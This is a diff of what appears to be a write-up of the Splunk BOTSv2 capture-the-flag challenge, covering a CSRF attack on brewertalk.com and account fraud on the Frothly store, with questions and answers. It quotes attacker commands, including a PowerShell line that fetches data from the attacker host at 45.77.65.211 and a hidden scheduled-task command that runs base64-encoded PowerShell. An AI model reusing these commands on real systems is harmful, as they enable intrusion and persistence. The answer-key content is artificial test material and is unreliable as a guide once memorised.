@@ -352,7 +352,7 @@ Saw the length of the salt first and its value subsequently related to the frank
 
 ### **Q205**
 
-What is user btun's password on brewertalk.com?
+What is user btun's password on `brewertalk.com`?
 
 
 #### **Approach**
@@ -512,7 +512,7 @@ The cookie was sent to the attacker's server. Attacker got the admin session coo
 
 ### **Q208**
 
-The brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield's computer and used to help create an unauthorized admin user on brewertalk.com?
+The `brewertalk.com` web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield's computer and used to help create an unauthorized admin user on `brewertalk.com`?
 
 
 #### **Approach**
@@ -521,7 +521,7 @@ The brewertalk.com web site employed Cross Site Request Forgery (CSRF) technique
 `Note: Anti-CSRF tokens are usually hidden form elements set. If a form is submitted without the anti-CSRF token, the backend code of the website rejects the transaction to prevent malicious sources from attackers and they are temporary, random values linked to a user's current session `
 
 
-Attacker's script had stolen my_post_key in its script and uploaded to brewertalk.com to create a new user with the admin privilege under Kevin's session.
+Attacker's script had stolen my_post_key in its script and uploaded to `brewertalk.com` to create a new user with the admin privilege under Kevin's session.
 
 That was the anti-CSRF token of Kevin. 
 
@@ -546,13 +546,13 @@ I had got that anti-CSRF token from Q207.
 
 ### **Q209**
 
-What brewertalk.com username was maliciously created by a spearphishing attack?
+What `brewertalk.com` username was maliciously created by a spearphishing attack?
 
 
 #### **Approach**
 
 
-In Q207, it was seen that the username 'kIagerfield' was created.
+In Q207, it was seen that the username `kIagerfield` was created.
 
 
 **Answer: kIagerfield**
@@ -1247,7 +1247,7 @@ amsInitFailed was set to true making powershell assumes the AMSI engine failed t
 `$ser='https://45.77.65.211:443';$t='/admin/get.php';$DATA=$WC.DoWNLoaDDATA($SER+$T);`
 
 
-The attacker added the cookie connecting to their server "https://45.77.65.211:443" and used https connection to encrypt their connection not to be detected easily.
+The attacker added the cookie connecting to their server `https://45.77.65.211:443` and used https connection to encrypt their connection not to be detected easily.
 
 
 The uri was '/admin/get.php' and it's child CommandLine events, `C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"`, were the ones ran from the server after being connected. 
@@ -1406,7 +1406,7 @@ I got '1,395,796,324' but the official answer is
 
 ### **Q500**
 
-Individual clicks made by a user when interacting with a website are associated with each other using session identifiers. You can find session identifiers in the stream:http sourcetype. The Frothly store website session identifier is found in one of the stream:http fields and does not change throughout the user session. What session identifier is assigned to dberry398@mail.com when visiting the Frothly store for the very first time? Answer guidance: Provide the value of the field, not the field name.  
+Individual clicks made by a user when interacting with a website are associated with each other using session identifiers. You can find session identifiers in the stream:http sourcetype. The Frothly store website session identifier is found in one of the stream:http fields and does not change throughout the user session. What session identifier is assigned to `dberry398@mail.com` when visiting the Frothly store for the very first time? Answer guidance: Provide the value of the field, not the field name.  
 
 
 #### **Approach**
@@ -1567,7 +1567,7 @@ index=botsv2 sourcetype="stream:http"   url="http://store.froth.ly/magento2/cust
 <img width="1846" height="338" alt="image" src="https://github.com/user-attachments/assets/40b0d764-5f6b-45f1-98ef-bbf4944ca925" />
 
 
-Got the session_id as 'ZDd2VGcWWKcKM95o'
+Got the session_id as `ZDd2VGcWWKcKM95o`
 
 Went to the another 'edit' url.
 
@@ -1761,7 +1761,7 @@ index=botsv2 sourcetype="stream:http" url="http://store.froth.ly/magento2/custom
 
 ### **Q504**
 
-What is the domain name used in email addresses by someone creating multiple accounts on the Frothly store website (http://store.froth.ly) that appear to have machine-generated usernames?
+What is the domain name used in email addresses by someone creating multiple accounts on the Frothly store website (`http://store.froth.ly`) that appear to have machine-generated usernames?
 
 
 #### **Approach**
@@ -1793,7 +1793,7 @@ index=botsv2 sourcetype="stream:http" form_data=* url="*login*"
 <img width="1847" height="437" alt="image" src="https://github.com/user-attachments/assets/ea0ddbca-f7c5-4597-b10c-f24f16a7a1e5" />
 
 
-Found the machine generated usernames with 'elude.in' domain by seeing its username pattern. They are were clearly shown as generated from a tool or script.
+Found the machine generated usernames with `elude.in` domain by seeing its username pattern. They are were clearly shown as generated from a tool or script.
 
 Checked the malicious domain again by using ut_shannon macro to see the entropy value of the usernames by the domain. 
 
@@ -1813,7 +1813,7 @@ index=botsv2 sourcetype="stream:http" form_data=* url="http://store.froth.ly/mag
 elude.in had the third most entropy value with 52 counts and the first and second had only 1 count for each.
 
 
-**Answer: elude.in**
+**Answer: `elude.in`**
 
 
 ### **Q505**
@@ -1841,7 +1841,7 @@ index=botsv2 sourcetype="stream:http" form_data=* url="http://store.froth.ly/mag
 <img width="1855" height="642" alt="image" src="https://github.com/user-attachments/assets/fec87fd0-439f-4284-894b-8726f2ff186e" />
 
 
-**Answer: Tom2014@msn.com**
+**Answer: `Tom2014@msn.com`**
 
 
 ### **Q506**
@@ -1927,7 +1927,7 @@ I wanted to see how many unique users used the same password and thus, deduplica
 
 ### **Q508**
 
-Which HTML page was most clicked by users before landing on http://store.froth.ly/magento2/checkout/ on August 19th? Answer guidance: Use earliest=1503126000 and latest=1503212400 to identify August 19th. Answer example: http://store.froth.ly/magento2/bigbrew.html 
+Which HTML page was most clicked by users before landing on `http://store.froth.ly/magento2/checkout/` on August 19th? Answer guidance: Use earliest=1503126000 and latest=1503212400 to identify August 19th. Answer example: `http://store.froth.ly/magento2/bigbrew.html`
 
 
 #### **Approach**
